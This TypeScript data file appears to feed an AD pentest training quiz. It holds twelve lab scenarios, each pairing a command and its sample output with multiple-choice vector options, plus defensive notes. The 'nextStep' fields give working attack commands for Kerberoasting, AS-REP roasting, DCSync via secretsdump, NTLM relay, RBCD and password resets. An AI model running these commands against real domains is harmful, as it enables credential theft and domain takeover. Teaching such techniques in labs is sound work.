import type { PracticeScenario } from "./types";

export const scenarios: PracticeScenario[] = [
  {
    id: "s1",
    title: "Scenario 1 · Shell on a web service",
    scenario:
      "You compromised a shell as 'iis apppool\\defaultapppool' on WEB01.lab.local. Before hunting for credentials on disk, you want to know whether you can escalate locally.",
    command: "whoami /priv",
    output: `PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeAssignPrimaryTokenPrivilege Assign primary token to process      Disabled
SeImpersonatePrivilege        Impersonate a client after auth      Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process   Disabled
SeAuditPrivilege              Generate security audits             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeCreateGlobalPrivilege       Create global objects                Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled`,
    question: "Which local escalation vector matches this output?",
    hint: "Look for Se* privileges in Enabled state. A web service with impersonation usually points to Potato techniques in lab.",
    options: [
      {
        vectorId: "se-impersonate",
        label: "SeImpersonate — impersonation after authentication (Potato in lab)",
        correct: true,
        feedback:
          "Correct. SeImpersonatePrivilege Enabled is the classic signature: the process can adopt the identity of authenticated clients. On IIS/SQL service accounts, the pedagogical path is token abuse → SYSTEM.",
      },
      {
        vectorId: "se-debug",
        label: "SeDebug — debug system processes (LSASS)",
        correct: false,
        feedback:
          "No. SeDebugPrivilege is not Enabled here. SeDebug would open processes like LSASS for credential dumping, not client impersonation.",
      },
      {
        vectorId: "se-backup",
        label: "SeBackup — read files bypassing read ACLs",
        correct: false,
        feedback:
          "No. SeBackupPrivilege is also not Enabled. SeBackup lets you read objects ignoring normal ACLs (SAM/SYSTEM hives), not impersonation.",
      },
    ],
    keyLines: ["SeImpersonatePrivilege", "Impersonate a client after auth", "Enabled"],
    explanation: [
      "whoami /priv is the first step on any Windows host: it lists the current token's privileges, not just groups.",
      "SeImpersonate + service context = course local vector. The next lab step is identify local listeners and practice a documented Potato technique.",
    ],
    nextStep:
      "Identify the service (IIS/MSSQL) and practice GodPotato/JuicyPotato only in an authorized lab",
  },
  {
    id: "s2",
    title: "Scenario 2 · Support account with too many rights",
    scenario:
      "You compromised the helpdesk workstation. User 'helpdesk01' has unusual local privileges for an interactive account.",
    command: "whoami /priv",
    output: `PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeDebugPrivilege              Debug programs                       Enabled
SeImpersonatePrivilege        Impersonate a client after auth      Disabled
SeBackupPrivilege             Back up files and directories        Disabled
SeRestorePrivilege            Restore files and directories        Disabled
SeTakeOwnershipPrivilege      Take ownership of files              Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process   Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled`,
    question: "What is the most direct local vector with this output?",
    hint: "SeDebug Enabled lets you open privileged system processes, including LSASS.",
    options: [
      {
        vectorId: "se-debug",
        label: "SeDebug — open LSASS and extract credentials in lab",
        correct: true,
        feedback:
          "Correct. SeDebugPrivilege Enabled lets you debug (and access) other users' processes, including system ones. In lab, LSASS holds authentication secrets.",
      },
      {
        vectorId: "se-impersonate",
        label: "SeImpersonate — Potato techniques toward SYSTEM",
        correct: false,
        feedback:
          "No. SeImpersonatePrivilege is Disabled. Without active impersonation, Potato does not apply via this path.",
      },
      {
        vectorId: "sam-lsa-dump",
        label: "SAM/LSA dump — dump local hives with admin",
        correct: false,
        feedback:
          "Not the primary signature here. SAM/LSA requires local admin/SYSTEM for hive dumps; SeDebug is the direct clue in whoami /priv (LSASS access).",
      },
    ],
    keyLines: ["SeDebugPrivilege", "Debug programs", "Enabled"],
    explanation: [
      "SeDebug on non-admin interactive accounts is a common misconfiguration in labs. It is a high-risk signal.",
      "Blue team: audit User Rights Assignment, remove unnecessary SeDebug, protect LSASS (PPL, Credential Guard, EDR).",
    ],
    nextStep:
      "In authorized lab: LSASS dump with documented tool → analyze domain credentials",
  },
  {
    id: "s3",
    title: "Scenario 3 · Backup account with privileged access",
    scenario:
      "You gained access to the 'backup_agent' service account on FILE01.lab.local. It is a backup account, not local admin.",
    command: "whoami /priv",
    output: `PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeBackupPrivilege             Back up files and directories        Enabled
SeRestorePrivilege            Restore files and directories        Enabled
SeImpersonatePrivilege        Impersonate a client after auth      Disabled
SeDebugPrivilege              Debug programs                       Disabled
SeTakeOwnershipPrivilege      Take ownership of files              Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process   Disabled`,
    question: "Which local vector lets you read ACL-protected secrets?",
    hint: "SeBackup Enabled = read files ignoring normal permissions. Think registry hives.",
    options: [
      {
        vectorId: "se-backup",
        label: "SeBackup — read SAM/SYSTEM and on-disk secrets bypassing ACLs",
        correct: true,
        feedback:
          "Correct. SeBackupPrivilege lets you read almost any file as backup software would. In lab, SAM/SYSTEM/SECURITY hives are the classic pedagogical target.",
      },
      {
        vectorId: "se-restore",
        label: "SeRestore — write files bypassing write ACLs",
        correct: false,
        feedback:
          "Partially related (SeRestore is also Enabled), but the question targets reading secrets. SeRestore is the write vector; SeBackup is the read-bypass signature.",
      },
      {
        vectorId: "se-debug",
        label: "SeDebug — access LSASS memory",
        correct: false,
        feedback:
          "No. SeDebugPrivilege is Disabled. SeDebug opens in-memory processes; SeBackup reads on-disk files ignoring ACLs.",
      },
    ],
    keyLines: ["SeBackupPrivilege", "Back up files and directories", "Enabled"],
    explanation: [
      "SeBackup and SeRestore often appear together on real backup accounts, but each enables a different abuse: read vs write.",
      "Key lesson: Windows ACLs are not the last line of defense if backup privileges are misassigned.",
    ],
    nextStep:
      "In lab: reg save or robocopy with /B to read hives → extract local NTLM hashes",
  },
  {
    id: "s4",
    title: "Scenario 4 · Users without Kerberos preauth",
    scenario:
      "You enumerated valid users on lab.local. You want credentials without knowing the target's current password.",
    command:
      "impacket-GetNPUsers lab.local/ -dc-ip 10.10.10.10 -usersfile users.txt -format hashcat -no-pass",
    output: `$krb5asrep$23$legacy.user@LAB.LOCAL:8A3F2B1C9D0E7F6A5B4C3D2E1F0A9B8...
$krb5asrep$23$svc_old@LAB.LOCAL:1F0E9D8C7B6A5948372615049382716...

[*] Got AS-REP for legacy.user@LAB.LOCAL
[*] Got AS-REP for svc_old@LAB.LOCAL`,
    question: "Which Kerberos vector explains these hashes?",
    hint: "AS-REP without preauth → offline crackable hash. The tool is GetNPUsers, not GetUserSPNs.",
    options: [
      {
        vectorId: "asrep-roast",
        label: "AS-REP Roasting — accounts with DONT_REQ_PREAUTH",
        correct: true,
        feedback:
          "Correct. GetNPUsers obtains AS-REP from users without Kerberos preauthentication. $krb5asrep$ hashes are cracked offline without touching the DC again.",
      },
      {
        vectorId: "kerberoasting",
        label: "Kerberoasting — TGS from service accounts with SPN",
        correct: false,
        feedback:
          "No. Kerberoasting produces $krb5tgs$ from SPN accounts and requires valid credentials to request TGS. Here you have $krb5asrep$ and -no-pass worked.",
      },
      {
        vectorId: "shadow-credentials",
        label: "Shadow Credentials — write KeyCredentialLink",
        correct: false,
        feedback:
          "No. Shadow Credentials requires write permission on msDS-KeyCredentialLink and PKINIT authentication, not AS-REP roasting.",
      },
    ],
    keyLines: ["$krb5asrep$23$", "GetNPUsers", "Got AS-REP", "-no-pass"],
    explanation: [
      "AS-REP Roasting exploits accounts with 'Do not require Kerberos preauthentication'. Anyone can request a crackable AS-REP.",
      "Mitigation: require preauth on all accounts and strong passwords. In lab, the flow is crack → validate creds → continue enum.",
    ],
    nextStep: "hashcat -m 18200 asrep_hashes.txt wordlist.txt",
  },
  {
    id: "s5",
    title: "Scenario 5 · Domain accounts with SPNs",
    scenario:
      "You have credentials for 'lowpriv@lab.local' and want crackable service accounts offline before moving laterally.",
    command:
      "impacket-GetUserSPNs lab.local/lowpriv:'Password1!' -dc-ip 10.10.10.10 -request",
    output: `ServicePrincipalName                     MemberOf
---------------------------------------- --------------------------------
MSSQLSvc/sql01.lab.local:1433            CN=SQL Admins,OU=Groups,DC=lab,DC=local
HTTP/web01.lab.local                   CN=WebOps,OU=Groups,DC=lab,DC=local

$krb5tgs$23$*svc_sql$LAB.LOCAL$lab.local/svc_sql*$A1B2C3D4E5F6...
$krb5tgs$23$*svc_web$LAB.LOCAL$lab.local/svc_web*$F6E5D4C3B2A1...`,
    question: "Which Kerberos vector are you exploiting?",
    hint: "TGS requested with -request + $krb5tgs$ hashes → offline cracking of service accounts.",
    options: [
      {
        vectorId: "kerberoasting",
        label: "Kerberoasting — TGS from SPN accounts, crack offline",
        correct: true,
        feedback:
          "Correct. GetUserSPNs -request returns crackable TGS from accounts with servicePrincipalName. Classic path: enum → roast → crack → reuse creds.",
      },
      {
        vectorId: "asrep-roast",
        label: "AS-REP Roasting — users without preauthentication",
        correct: false,
        feedback:
          "No. AS-REP uses GetNPUsers and produces $krb5asrep$ hashes, not $krb5tgs$. Here you requested TGS from SPNs, not preauth-less AS-REP.",
      },
      {
        vectorId: "dcsync",
        label: "DCSync — replicate secrets from the DC",
        correct: false,
        feedback:
          "No. DCSync requires DS-Replication-Get-Changes(+All) permissions and uses secretsdump, not crackable SPN TGS.",
      },
    ],
    keyLines: ["ServicePrincipalName", "$krb5tgs$23$", "-request"],
    explanation: [
      "Kerberoasting: any authenticated user can request TGS from accounts with SPN. Ticket material derives from the service account password.",
      "After offline cracking with hashcat/John, validate the password in lab and look for lateral movement (SQL, web, privileged groups).",
    ],
    nextStep: "hashcat -m 13100 hashes.txt wordlist.txt",
  },
  {
    id: "s6",
    title: "Scenario 6 · BloodHound path toward DC secrets",
    scenario:
      "You imported the BloodHound collection. User 'backup_svc' has a dangerous edge toward the lab.local domain.",
    command: "BloodHound → Node: backup_svc → Outbound Object Control",
    output: `User: backup_svc@lab.local
  ├─ MemberOf → Backup Operators (lab.local)
  └─ GetChanges (Extended Right) → lab.local
  └─ GetChangesAll (Extended Right) → lab.local

Path summary: backup_svc → DCSync → NTDS hashes on DC01.lab.local`,
    question: "Which ACL/AD vector lets you extract hashes from the DC?",
    hint: "GetChanges + GetChangesAll on the domain = replication as if you were a DC.",
    options: [
      {
        vectorId: "dcsync",
        label: "DCSync — replicate NTDS via AD replication protocol",
        correct: true,
        feedback:
          "Correct. GetChanges and GetChangesAll are DCSync rights. With them, secretsdump can request hashes (incl. krbtgt) from the DC without being de facto Domain Admin.",
      },
      {
        vectorId: "generic-all",
        label: "GenericAll — full control over an AD object",
        correct: false,
        feedback:
          "No. GenericAll gives Full Control over a specific object, but the signature here is specific: Extended Rights GetChanges/GetChangesAll on the domain.",
      },
      {
        vectorId: "force-change-password",
        label: "ForceChangePassword — reset another user's password",
        correct: false,
        feedback:
          "No. ForceChangePassword lets you change a target user's password, not replicate the domain NTDS database.",
      },
    ],
    keyLines: ["GetChanges", "GetChangesAll", "DCSync", "NTDS hashes"],
    explanation: [
      "BloodHound visualizes ACL edges: GetChanges + GetChangesAll → DCSync node. It is almost always game over in AD labs.",
      "Key blue team detection: replication from non-DC hosts. Mitigate by auditing who has those Extended Rights.",
    ],
    nextStep: "impacket-secretsdump lab.local/backup_svc:'NewPass!'@DC01.lab.local",
  },
  {
    id: "s7",
    title: "Scenario 7 · Helpdesk with permission over IT admin",
    scenario:
      "You are 'helpdesk02@lab.local'. BloodHound shows a direct edge toward the lab's systems administrator.",
    command: "BloodHound → Edge: helpdesk02 → ForceChangePassword → it.admin",
    output: `User: helpdesk02@lab.local
  └─ ForceChangePassword (Extended Right) → it.admin@lab.local
     └─ MemberOf → Server Admins, Domain Admins (lab.local)

Path summary: helpdesk02 → reset it.admin password → Domain Admin access`,
    question: "Which ACL vector describes this BloodHound edge?",
    hint: "ForceChangePassword = reset another user's password without knowing the current one.",
    options: [
      {
        vectorId: "force-change-password",
        label: "ForceChangePassword — controlled password reset in lab",
        correct: true,
        feedback:
          "Correct. ForceChangePassword (User-Force-Change-Password) lets you change the target's password. It is a didactic ACL vector: a narrow permission → high-value identity.",
      },
      {
        vectorId: "generic-all",
        label: "GenericAll — full control over the target user",
        correct: false,
        feedback:
          "No. GenericAll would be complete Full Control. The specific signature here is ForceChangePassword, a concrete Extended Right.",
      },
      {
        vectorId: "write-dacl",
        label: "WriteDACL — rewrite object permissions",
        correct: false,
        feedback:
          "No. WriteDACL lets you modify the DACL to grant yourself more rights. Here you already have the direct right to force a password change.",
      },
    ],
    keyLines: ["ForceChangePassword", "Extended Right", "it.admin"],
    explanation: [
      "ForceChangePassword is a common ACL in misconfigured helpdesk scenarios. Impact depends on who it points to.",
      "Blue team: event 4724 (password reset) and periodic review of Extended Rights on privileged accounts.",
    ],
    nextStep:
      "net rpc password it.admin 'LabNewPass123!' -U lab.local/helpdesk02%Password1! -S DC01.lab.local",
  },
  {
    id: "s8",
    title: "Scenario 8 · Write access on a computer object",
    scenario:
      "You compromised 'dev_junior@lab.local'. BloodHound flags GenericWrite on server SQL02.",
    command: "BloodHound → Node: SQL02$ → Inbound Object Control",
    output: `Computer: SQL02.lab.local
  └─ GenericWrite ← dev_junior@lab.local
  └─ msDS-AllowedToActOnBehalfOfOtherIdentity: (not set)

Suggested abuse: dev_junior → GenericWrite → configure RBCD → impersonate admin toward SQL02`,
    question: "Which delegation vector fits GenericWrite on a computer?",
    hint: "If you can write msDS-AllowedToActOnBehalfOfOtherIdentity, you configure who delegates to that host.",
    options: [
      {
        vectorId: "rbcd",
        label: "RBCD — Resource-Based Constrained Delegation on SQL02",
        correct: true,
        feedback:
          "Correct. GenericWrite on a computer lets you configure msDS-AllowedToActOnBehalfOfOtherIdentity. With your own machine account, you can impersonate users toward that host.",
      },
      {
        vectorId: "constrained-delegation",
        label: "Constrained Delegation — msDS-AllowedToDelegateTo",
        correct: false,
        feedback:
          "No. Constrained delegation is configured on the delegating account (msDS-AllowedToDelegateTo), not the destination resource. RBCD inverts the model: the resource decides who delegates.",
      },
      {
        vectorId: "unconstrained-delegation",
        label: "Unconstrained Delegation — TRUSTED_FOR_DELEGATION",
        correct: false,
        feedback:
          "No. Unconstrained delegation stores TGTs of authenticating users. The signature here is write on computer object → RBCD, not TrustedForDelegation.",
      },
    ],
    keyLines: ["GenericWrite", "msDS-AllowedToActOnBehalfOfOtherIdentity", "RBCD"],
    explanation: [
      "RBCD is the typical abuse after GenericWrite/WriteAccountRestrictions on machine accounts.",
      "Pedagogical chain: ACL → create/configure machine account → AllowedToAct → S4U → local admin on the host.",
    ],
    nextStep:
      "impacket-rbcd -action write -delegate-from EVILPC$ -delegate-to SQL02$ -dc-ip 10.10.10.10 lab.local/dev_junior:Password1!",
  },
  {
    id: "s9",
    title: "Scenario 9 · Server with unconstrained delegation",
    scenario:
      "You enumerated Kerberos delegation in lab.local. You found a legacy host with dangerous configuration.",
    command: "Get-DomainComputer -Unconstrained | select name, useraccountcontrol",
    output: `name        useraccountcontrol
----        ------------------
PRINT01     528384  (WORKSTATION_TRUST_ACCOUNT | TRUSTED_FOR_DELEGATION)
SQL02       4096    (WORKSTATION_TRUST_ACCOUNT)
FILE01      528384  (WORKSTATION_TRUST_ACCOUNT | TRUSTED_FOR_DELEGATION)

[*] PRINT01: TRUSTED_FOR_DELEGATION — stores TGTs of authenticating users`,
    question: "Which delegation vector explains TRUSTED_FOR_DELEGATION?",
    hint: "An unconstrained host stores TGTs of whoever authenticates. Combine with coerce in advanced labs.",
    options: [
      {
        vectorId: "unconstrained-delegation",
        label: "Unconstrained Delegation — capture and reuse TGTs",
        correct: true,
        feedback:
          "Correct. TRUSTED_FOR_DELEGATION (528384 on workstations) indicates unconstrained delegation. If you control that host, you can extract TGTs of users who authenticate to it.",
      },
      {
        vectorId: "rbcd",
        label: "RBCD — msDS-AllowedToActOnBehalfOfOtherIdentity",
        correct: false,
        feedback:
          "No. RBCD is configured by writing AllowedToAct on the destination computer. TRUSTED_FOR_DELEGATION is the classic unconstrained flag.",
      },
      {
        vectorId: "constrained-delegation",
        label: "Constrained Delegation — S4U toward specific SPNs",
        correct: false,
        feedback:
          "No. Constrained delegation is limited to SPNs in msDS-AllowedToDelegateTo. Unconstrained has no such restriction: it stores full TGTs.",
      },
    ],
    keyLines: ["TRUSTED_FOR_DELEGATION", "528384", "stores TGTs"],
    explanation: [
      "Unconstrained delegation was common on old DCs; today it persists on poorly migrated legacy servers.",
      "In advanced lab: coerce (PetitPotam/PrinterBug) → DA auth to PRINT01 → Rubeus monitor/extract → reuse TGT.",
    ],
    nextStep:
      "Compromise PRINT01 local admin → Rubeus monitor /tgt → force auth with coerce in authorized lab",
  },
  {
    id: "s10",
    title: "Scenario 10 · SYSVOL with legacy policies",
    scenario:
      "You have read access to lab.local SYSVOL. You hunt for forgotten credentials in GPOs.",
    command:
      "impacket-GetGPPPassword -dc-ip 10.10.10.10 'lab.local/lowpriv:Password1!'",
    output: `[*] Searching for cpassword in \\\\lab.local\\SYSVOL\\lab.local\\Policies\\

[+] Found cpassword in Groups.xml
    User: lab.local\\svc_deploy
    Password: SuperSecretDeploy2024!

[+] Found cpassword in Services\\DatabaseConnection.xml
    User: lab.local\\svc_sql
    Password: SqlAdminPass!`,
    question: "Which credentials vector explains cpassword in SYSVOL?",
    hint: "Group Policy Preferences stored passwords encrypted with a publicly known AES key.",
    options: [
      {
        vectorId: "gpp-passwords",
        label: "GPP Passwords — cpassword in Group Policy XML",
        correct: true,
        feedback:
          "Correct. Legacy GPPs stored passwords as cpassword inside XML in SYSVOL. The AES key was public → trivial decryption. Still appears in labs with legacy GPOs.",
      },
      {
        vectorId: "asrep-roast",
        label: "AS-REP Roasting — users without preauthentication",
        correct: false,
        feedback:
          "No. AS-REP roasting obtains Kerberos hashes from accounts without preauth. Here you found plaintext passwords after decrypting GPO cpassword.",
      },
      {
        vectorId: "kerberoasting",
        label: "Kerberoasting — TGS from SPN accounts",
        correct: false,
        feedback:
          "No. Kerberoasting attacks TGS tickets from SPNs. GPP passwords are static credentials in Group Policy XML files.",
      },
    ],
    keyLines: ["cpassword", "Groups.xml", "SYSVOL"],
    explanation: [
      "MS14-025 patched creation of new GPP cpassword entries, but many lab (and legacy real) environments keep old XML.",
      "Mitigation: remove cpassword from SYSVOL, rotate exposed passwords, audit \\\\domain\\SYSVOL periodically.",
    ],
    nextStep:
      "Validate svc_deploy and svc_sql in lab → enumerate SPNs and groups for each account",
  },
  {
    id: "s11",
    title: "Scenario 11 · Coerce + relay toward LDAP",
    scenario:
      "In the lab you set up a listener and forced authentication from the DC. LDAP signing is disabled.",
    command: "ntlmrelayx.py -t ldap://DC01.lab.local --escalate-user lowpriv",
    output: `[*] Servers started, waiting for connections
[*] SMBD: Received connection from 10.10.10.10 (DC01$)
[*] Authenticating against ldap://DC01.lab.local as LAB/DC01$ SUCCEED
[*] Relayed NTLM authentication from DC01$@LAB.LOCAL
[*] User lowpriv successfully escalated via LDAP relay (WriteDACL on domain)

[!] Coerce triggered via PetitPotam (EfsRpcOpenFileRaw) → 10.10.10.50`,
    question: "Which vector describes the coerce → relay → escalation chain?",
    hint: "PetitPotam forces auth; ntlmrelayx forwards NTLM to an unsigned service. The signature is the flow, not a specific CVE.",
    options: [
      {
        vectorId: "petitpotam-relay",
        label: "Coerce + NTLM Relay — PetitPotam → LDAP relay without signing",
        correct: true,
        feedback:
          "Correct. The pedagogical signature is: coerce (PetitPotam/PrinterBug) forces NTLM auth → relay toward LDAP/SMB/HTTP without signing → abuse the destination service.",
      },
      {
        vectorId: "unconstrained-delegation",
        label: "Unconstrained Delegation — in-memory TGT capture",
        correct: false,
        feedback:
          "No. Unconstrained captures Kerberos TGTs, not NTLM relay. Here the flow is NTLM relay after coerce, typical when LDAP signing is off.",
      },
      {
        vectorId: "dcsync",
        label: "DCSync — direct NTDS replication",
        correct: false,
        feedback:
          "No. DCSync uses AD replication rights (GetChanges/GetChangesAll). LDAP relay may escalate privileges, but the initial signature is coerce + NTLM relay.",
      },
    ],
    keyLines: ["ntlmrelayx", "PetitPotam", "Relayed NTLM", "LDAP signing"],
    explanation: [
      "Do not memorize a CVE: understand the coerce → relay → vulnerable service pattern. PetitPotam is a popular coerce in labs.",
      "Mitigation: SMB/LDAP signing + EPA, coerce patches, network segmentation. ADCS ESC8 is a relay variant toward HTTP enrollment.",
    ],
    nextStep:
      "With WriteDACL obtained: dacledit for GenericAll → continue BloodHound enum in lab",
  },
  {
    id: "s12",
    title: "Scenario 12 · Creating machine accounts in the domain",
    scenario:
      "You are an authenticated user without admin privileges. You want to know if you can join machines to the domain to abuse RBCD.",
    command: "(Get-DomainObject lab.local).ms-DS-MachineAccountQuota",
    output: `(Get-DomainObject lab.local).ms-DS-MachineAccountQuota
10

[*] Default ms-DS-MachineAccountQuota = 10 (users can create up to 10 machine accounts)

impacket-addcomputer -computer-name 'EVILPC$' -computer-pass 'EvilPass123!' lab.local/lowpriv:Password1!
[+] Successfully added machine account EVILPC$ to domain lab.local`,
    question: "Which vector explains EVILPC$ creation by a normal user?",
    hint: "ms-DS-MachineAccountQuota > 0 lets authenticated users create machine accounts without being admin.",
    options: [
      {
        vectorId: "machine-account-quota",
        label: "Machine Account Quota — users create computer objects (MAQ)",
        correct: true,
        feedback:
          "Correct. ms-DS-MachineAccountQuota defines how many machine accounts an authenticated user can create. MAQ > 0 enables addcomputer → foundation for RBCD and other abuses.",
      },
      {
        vectorId: "rbcd",
        label: "RBCD — resource-based delegation",
        correct: false,
        feedback:
          "RBCD is the follow-on abuse (writing AllowedToAct), not the initial machine account creation. MAQ is the prerequisite that makes it possible.",
      },
      {
        vectorId: "generic-all",
        label: "GenericAll — full control over AD objects",
        correct: false,
        feedback:
          "No. GenericAll requires explicit ACL on an object. MAQ is a default domain limit that allows creating machines without admin rights.",
      },
    ],
    keyLines: ["ms-DS-MachineAccountQuota", "10", "addmachine", "EVILPC$"],
    explanation: [
      "By default Windows lets authenticated users create up to 10 machine accounts. Many labs leave MAQ at default.",
      "Typical chain: MAQ → create EVILPC$ → RBCD (if GenericWrite on a server) → escalation. Mitigate: MAQ=0 and audit new computer objects.",
    ],
    nextStep:
      "BloodHound: look for GenericWrite toward computers → prepare RBCD with EVILPC$ in lab",
  },
];
